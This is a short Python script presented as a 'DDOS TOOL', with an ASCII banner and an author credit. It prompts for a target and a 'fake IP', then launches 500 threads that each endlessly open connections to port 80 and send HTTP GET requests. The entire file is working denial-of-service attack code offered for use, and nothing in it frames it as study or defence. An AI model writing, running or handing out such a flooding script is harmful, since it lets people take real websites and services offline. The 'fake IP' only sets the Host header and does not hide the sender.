import os
import socket
import threading
from time import *


os.system("color 2")
sleep(1)
print("██████╗░██████╗░░█████╗░░██████╗  ████████╗░█████╗░░█████╗░██╗░░░░░")
print("██╔══██╗██╔══██╗██╔══██╗██╔════╝  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░")
print("██║░░██║██║░░██║██║░░██║╚█████╗░  ░░░██║░░░██║░░██║██║░░██║██║░░░░░")
print("██║░░██║██║░░██║██║░░██║░╚═══██╗  ░░░██║░░░██║░░██║██║░░██║██║░░░░░")
print("██████╔╝██████╔╝╚█████╔╝██████╔╝  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗")
print("╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝")
sleep(1)
print("")
print("by mike.malyhin")
sleep(1)
print("GitHub - https://github.com/malyhin/")
print("")
sleep(1)
target = input("Enter Target: ")
fake_ip = input("Enter Fake IP: ")
port = 80
attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(f'attack number: {attack_num}')
        
        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
